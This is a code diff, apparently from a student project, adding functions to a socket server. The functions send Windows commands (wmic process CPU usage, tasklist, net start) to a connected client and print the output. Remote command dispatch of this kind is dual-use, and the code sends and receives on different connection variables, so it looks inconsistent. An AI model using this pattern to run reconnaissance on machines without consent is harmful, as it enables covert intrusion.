@@ -63,5 +63,45 @@ def NetworkInfo():
     print('Output: ', output)
     break
 
+    
+#Zees stuff
+def cpuusage():
+    while True:
+        command = 'wmic path Win32_PerfFormattedData_PerfProc_Process get Name,PercentProcessorTime,IDProcess'
+        command = command.encode()
+        currConn.send(command)
+        print('Command sent to client: ', command)
+        
+        output = client.recv(8096)
+        output = output.decode()
+        print('Output: ', output)
+        break
+
+def tasks():
+    while True:
+        #send command to client
+        command = 'tasklist'
+        command = command.encode()
+        currConn.send(command)
+        print('Command sent to client: ', command)
+        
+        #receive output from client
+        output = client.recv(8096) #tajul is this enough for tasklist?
+        output = output.decode()
+        print('Output: ', output)
+        break
+
+def services():
+    while True:
+        command = 'net start'
+        command = command.encode()
+        currConn.send(command)
+        print('Command sent to client: ', command)
+        
+        output = client.recv(8096)
+        output = output.decode()
+        print('Output: ', output)
+        break
+    
 if __name__ == '__main__':
     Main().run()
